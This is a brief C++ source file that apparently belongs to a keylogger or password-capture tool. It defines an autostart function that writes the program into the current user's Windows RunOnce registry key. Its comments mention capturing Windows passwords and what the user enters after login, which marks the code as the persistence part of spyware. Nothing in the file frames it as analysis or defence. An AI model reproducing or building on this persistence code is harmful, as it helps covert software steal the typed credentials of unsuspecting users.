#include "pch.h"
#include "autostart.h"

//adds to "run once" registry key of current user
//has about 1 to 5 seconds of delay before running
//may not capture windows passwords or anything entered before that delay
bool autostart::addto_runonce(const std::wstring& data) {
	std::wstring key = L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
	std::wstring value = DISPLAY_NAME;

	return writereg(key, value, data);
}